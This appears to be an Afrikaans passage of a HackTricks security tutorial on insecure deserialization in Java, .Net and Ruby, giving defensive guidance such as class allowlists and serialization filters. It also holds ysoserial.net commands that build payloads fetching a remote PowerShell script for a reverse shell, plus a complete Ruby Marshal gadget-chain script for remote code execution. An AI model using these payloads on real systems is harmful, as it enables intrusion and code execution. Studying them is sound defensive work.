'n Klas wat `Serializable` implementeer, kan enige objek binne die klas as `verganklik` implementeer wat nie serialiseerbaar moet wees nie. Byvoorbeeld:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermy Serialisering van 'n klas wat `Serializable` moet implementeer

In situasies waar sekere **voorwerpe die `Serializable`-koppelvlak moet implementeer** as gevolg van klas-hierargie, is daar 'n risiko van onbedoelde deserialisering. Om dit te voorkom, moet daar verseker word dat hierdie voorwerpe nie deserialiseerbaar is deur 'n `final` `readObject()`-metode te definieer wat konsekwent 'n uitsondering gooi, soos hieronder getoon:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbetering van Deserialisering Sekuriteit in Java**

**Aanpassing van `java.io.ObjectInputStream`** is 'n praktiese benadering vir die beveiliging van deserialisering prosesse. Hierdie metode is geskik wanneer:

* Die deserialisering kode onder jou beheer is.
* Die klasse wat vir deserialisering verwag word, bekend is.

Oorskryf die **`resolveClass()`** metode om deserialisering te beperk tot slegs toegelate klasse. Dit voorkom deserialisering van enige klasse behalwe di√© wat uitdruklik toegelaat is, soos in die volgende voorbeeld wat deserialisering beperk tot die `Bicycle` klasse slegs:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Die gebruik van 'n Java-agent vir Sekuriteitsverbetering** bied 'n noodoplossing wanneer kodemodifikasie nie moontlik is nie. Hierdie metode is hoofsaaklik van toepassing vir die **swartlysmaak van skadelike klasse**, deur 'n JVM-parameter te gebruik:
```
-javaagent:name-of-agent.jar
```
Dit bied 'n manier om deserialisasie dinamies te beveilig, ideaal vir omgewings waar onmiddellike kodeveranderinge onprakties is.

Kyk na 'n voorbeeld in [rO0 deur Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementering van Serialisasiefilters**: Java 9 het serialisasiefilters via die **`ObjectInputFilter`**-koppelvlak ingevoer, wat 'n kragtige meganisme bied om kriteria te spesifiseer wat geserialiseerde voorwerpe moet nakom voordat hulle gedeserialiseer word. Hierdie filters kan globaal of per stroom toegepas word, wat 'n fynbeheer oor die deserialisasieproses bied.

Om serialisasiefilters te gebruik, kan jy 'n globale filter instel wat van toepassing is op alle deserialisasie-operasies of dit dinamies konfigureer vir spesifieke strome. Byvoorbeeld:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Benutting van Eksterne Biblioteke vir Verbeterde Sekuriteit**: Biblioteke soos **NotSoSerial**, **jdeserialize**, en **Kryo** bied gevorderde kenmerke vir die beheer en monitering van Java deserialisering. Hierdie biblioteke kan addisionele veiligheidslaag bied, soos witlys of swartlys klasse, die analise van geserialiseerde voorwerpe voor deserialisering, en die implementering van aangepaste serialiseringsstrategie√´.

* **NotSoSerial** onderskep deserialiseringsprosesse om die uitvoering van onbetroubare kode te voorkom.
* **jdeserialize** maak die analise van geserialiseerde Java-voorwerpe moontlik sonder om hulle te deserialiseer, wat help om potensieel skadelike inhoud te identifiseer.
* **Kryo** is 'n alternatiewe serialiseringsraamwerk wat spoed en doeltreffendheid beklemtoon, met aanpasbare serialiseringsstrategie√´ wat die veiligheid kan verbeter.

### Verwysings

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialisering en ysoserial praatjie: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Praatjie oor gadgetinspekteur: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) en dia's: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec artikel: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java en .Net JSON deserialisering **artikel:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** praatjie: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) en dia's: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialiserings CVE's: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Vind wat **JNDI Injection** is, hoe om dit te misbruik via RMI, CORBA & LDAP en hoe om **log4shell** te benut (en 'n voorbeeld van hierdie kwesbaarheid) op die volgende bladsy:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Boodskapdiens

> Die **Java Boodskapdiens** (**JMS**) API is 'n Java-boodskapgeori√´nteerde middleware API vir die stuur van boodskappe tussen twee of meer kli√´nte. Dit is 'n implementering om die produsent-verbruiker-probleem te hanteer. JMS is 'n deel van die Java Platform, Enterprise Edition (Java EE), en is gedefinieer deur 'n spesifikasie wat ontwikkel is deur Sun Microsystems, maar wat sedertien deur die Java-gemeenskapsproses begelei is. Dit is 'n boodskapstandaard wat toelaat dat toepassingskomponente gebaseer op Java EE boodskappe kan skep, stuur, ontvang, en lees. Dit maak die kommunikasie tussen verskillende komponente van 'n verspreide toepassing losgekoppel, betroubaar, en asinkroon. (Vanaf [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkte

Daar is verskeie produkte wat hierdie middleware gebruik om boodskappe te stuur:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Uitbuiting

Dus, daar is basies 'n **klomp dienste wat JMS op 'n gevaarlike manier gebruik**. Daarom, as jy **genoeg voorregte** het om boodskappe na hierdie dienste te stuur (gewoonlik sal jy geldige geloofsbriewe benodig) kan jy in staat wees om **skadelike voorwerpe geserialiseer te stuur wat deur die verbruiker/gebruiker gedeserialiseer sal word**.\
Dit beteken dat in hierdie uitbuiting al die **kli√´nte wat daardie boodskap gaan gebruik, ge√Ønfekteer sal word**.

Onthou dat selfs as 'n diens kwesbaar is (omdat dit onveilig gebruikersinvoer deserialiseer) moet jy steeds geldige gadgets vind om die kwesbaarheid te benut.

Die instrument [JMET](https://github.com/matthiaskaiser/jmet) is geskep om **te koppel en hierdie dienste aan te val deur verskeie skadelike voorwerpe geserialiseer te stuur wat bekende gadgets gebruik**. Hierdie aanvalle sal werk as die diens steeds kwesbaar is en as enige van die gebruikte gadgets binne die kwesbare aansoek is.

### Verwysings

* JMET praatjie: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Dia's: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

In die konteks van .Net, werk deserialiseringsaanvalle op 'n manier soortgelyk aan di√© wat in Java gevind word, waar gadgets benut word om spesifieke kode uit te voer tydens die deserialisering van 'n voorwerp.
### Vingerafdruk

#### WhiteBox

Die bronkode moet nagegaan word vir voorkomste van:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Die fokus moet wees op serializeerders wat die tipe toelaat om bepaal te word deur 'n veranderlike onder gebruikersbeheer.

#### BlackBox

Die soektog moet gemik wees op die Base64-ge√´nkripteerde string **AAEAAAD/////** of enige soortgelyke patroon wat mag deur deserialisering aan die kant van die bediener gaan, wat beheer oor die tipe wat gedeserialiseer moet word, verleen. Dit kan insluit, maar is nie beperk tot, **JSON** of **XML** strukture wat `TypeObject` of `$type` bevat.

### ysoserial.net

In hierdie geval kan jy die gereedskap [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) gebruik om die deserialisering-uitbuitings te **skep**. Nadat jy die git-opslagplaas afgelaai het, moet jy die gereedskap **kompileer** deur byvoorbeeld Visual Studio te gebruik.

As jy wil leer oor **hoe ysoserial.net sy uitbuiting skep**, kan jy [**hierdie bladsy besoek waar die ObjectDataProvider-gadget + ExpandedWrapper + Json.Net-formatter verduidelik word**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die hoofopsies van **ysoserial.net** is: **`--gadget`**, **`--formatter`**, **`--output`** en **`--plugin`.**

* **`--gadget`** word gebruik om die gadget aan te dui wat misbruik moet word (dui die klas/funksie aan wat tydens deserialisering misbruik sal word om opdragte uit te voer).
* **`--formatter`**, gebruik om die metode aan te dui om die uitbuiting te serializeer (jy moet weet watter biblioteek die agterkant gebruik om die nutlading te deserialiseer en dieselfde gebruik om dit te serializeer)
* **`--output`** word gebruik om aan te dui of jy die uitbuiting in **rof** of **Base64**-ge√´nkripteerde vorm wil h√™. _Merk op dat **ysoserial.net** die nutlading sal **enkripteer** met behulp van **UTF-16LE** (enkodering wat standaard op Windows gebruik word), dus as jy die rof kry en dit net vanaf 'n Linux-konsole enkodeer, mag jy enige **enkoderingsverenigbaarheidsprobleme** h√™ wat die uitbuiting verhoed om behoorlik te werk (in HTB JSON-boks het die nutlading in beide UTF-16LE en ASCII gewerk, maar dit beteken nie dat dit altyd sal werk nie)._
* **`--plugin`** ysoserial.net ondersteun plugins om **uitbuitings vir spesifieke raamwerke** soos ViewState te skep

#### Meer ysoserial.net parameters

* `--minify` sal 'n **kleiner nutlading** voorsien (indien moontlik)
* `--raf -f Json.Net -c "iets"` Dit sal al die gadgets aandui wat met 'n verskafte formatter (`Json.Net` in hierdie geval) gebruik kan word
* `--sf xml` jy kan 'n gadget aandui (`-g`) en ysoserial.net sal soek na formatters wat "xml" bevat (hooflettergevoelig)

**ysoserial voorbeelde** om uitbuitings te skep:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** het ook 'n **baie interessante parameter** wat help om beter te verstaan hoe elke uitbuiting werk: `--test`\
As jy hierdie parameter aandui, sal **ysoserial.net** die **uitbuiting plaaslik probeer,** sodat jy kan toets of jou lading korrek sal werk.\
Hierdie parameter is nuttig omdat as jy die kode deurgaan, sal jy stukke kode soos die volgende een vind (van [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Dit beteken dat om die uitbuiting te toets, sal die kode [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aanroep.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In die **vorige kode is kwesbaar vir die skep van uitbuitings**. Dus, as jy iets soortgelyks in 'n .Net-toepassing vind, beteken dit waarskynlik dat daardie toepassing ook kwesbaar is.\
Daarom stel die **`--toets`** parameter ons in staat om te verstaan **watter stukke kode kwesbaar is** vir die deserialisasie-uitbuiting wat **ysoserial.net** kan skep.

### ViewState

Neem 'n kyk na [hierdie POST oor **hoe om te probeer om die \_\_ViewState-parameter van .Net te benut**](exploiting-\_\_viewstate-parameter.md) om **arbitr√™re kode uit te voer**. As jy **reeds die geheime** wat deur die slagoffer-masjien gebruik word, ken, [**lees hierdie pos om te weet hoe om kode uit te voer**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Voorkoming

Om die risiko's wat verband hou met deserialisasie in .Net te verminder:

* **Vermy dat datastrome hul objektipes definieer.** Maak gebruik van `DataContractSerializer` of `XmlSerializer` waar moontlik.
* **Stel vir `JSON.Net`, `TypeNameHandling` in op `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Vermy die gebruik van `JavaScriptSerializer` met 'n `JavaScriptTypeResolver`.**
* **Beperk die tipes wat gedeserialiseer kan word**, met begrip vir die inherente risiko's met .Net-tipes, soos `System.IO.FileInfo`, wat bedienersl√™er-eienskappe kan wysig, wat moontlik kan lei tot ontkenning van diensaanvalle.
* **Wees versigtig met tipes wat risikovolle eienskappe het**, soos `System.ComponentModel.DataAnnotations.ValidationException` met sy `Value`-eienskap, wat uitgebuit kan word.
* **Beheer tipe-instanti√´ring veilig** om aanvallers te verhoed om die deserialisasieproses te be√Ønvloed, wat selfs `DataContractSerializer` of `XmlSerializer` kwesbaar kan maak.
* **Implementeer witlysbeheer** deur 'n aangepaste `SerializationBinder` vir `BinaryFormatter` en `JSON.Net`.
* **Bly ingelig oor bekende onveilige deserialisasie-gadgets** binne .Net en verseker dat deserialiseerders nie sulke tipes instansieer nie.
* **Isoleer potensieel risikovolle kode** van kode met internettoegang om bekende gadgets, soos `System.Windows.Data.ObjectDataProvider` in WPF-toepassings, te vermy om aan onbetroubare data-bronne bloot te stel.

### **Verwysings**

* Java en .Net JSON deserialisasie **artikel:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** aanbieding: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) en dia's: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby word serialisasie fasiliteer deur twee metodes binne die **marshal**-biblioteek. Die eerste metode, bekend as **dump**, word gebruik om 'n objek in 'n byte-stroom te omskep. Hierdie proses word serialisasie genoem. Omgekeerd word die tweede metode, **load**, gebruik om 'n byte-stroom terug na 'n objek te herstel, 'n proses wat deserialisasie genoem word.

Vir die beveiliging van geserialiseerde objekte, **maak Ruby gebruik van HMAC (Hash-Based Message Authentication Code)**, wat die integriteit en egtheid van die data verseker. Die sleutel wat hiervoor gebruik word, word gestoor op een van verskeie moontlike plekke:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generiese deserialisasie na RCE-gadgetketting (meer inligting in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ander RCE-ketting om Ruby On Rails te benut: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
